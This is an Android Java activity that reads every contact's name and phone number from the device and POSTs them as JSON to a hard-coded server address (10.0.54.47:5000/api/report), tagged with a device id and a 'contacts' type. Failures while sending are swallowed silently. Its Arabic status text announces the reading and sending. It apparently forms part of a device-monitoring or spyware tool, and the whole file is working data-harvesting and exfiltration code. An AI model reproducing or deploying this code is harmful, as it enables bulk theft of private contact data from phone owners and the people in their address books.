package net.kashif;

import android.app.Activity;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.widget.*;
import org.json.*;
import java.io.*;
import java.net.*;

public class ContactsActivity extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        TextView tv = new TextView(this);
        tv.setText("جاري قراءة جهات الاتصال وإرسالها...");
        tv.setTextSize(20);
        tv.setPadding(20, 20, 20, 20);
        setContentView(tv);

        new Thread(new Runnable() {
            public void run() {
                try {
                    JSONArray arr = new JSONArray();
                    Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                    if (c != null) {
                        while (c.moveToNext()) {
                            JSONObject o = new JSONObject();
                            o.put("name", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                            o.put("phone", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                            arr.put(o);
                        }
                        c.close();
                    }
                    sendToServer(arr.toString());
                    final int count = arr.length();
                    runOnUiThread(new Runnable() {
                        public void run() { tv.setText("تم إرسال " + count + " جهة اتصال."); }
                    });
                } catch (Exception e) {
                    final String err = e.getMessage();
                    runOnUiThread(new Runnable() {
                        public void run() { tv.setText("فشل: " + err); }
                    });
                }
            }
        }).start();
    }

    private void sendToServer(String data) {
        try {
            URL url = new URL("http://10.0.54.47:5000/api/report");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            JSONObject j = new JSONObject();
            j.put("id", "DEVICE_ID");
            j.put("type", "contacts");
            j.put("data", data);
            conn.getOutputStream().write(j.toString().getBytes());
        } catch (Exception e) {}
    }
}
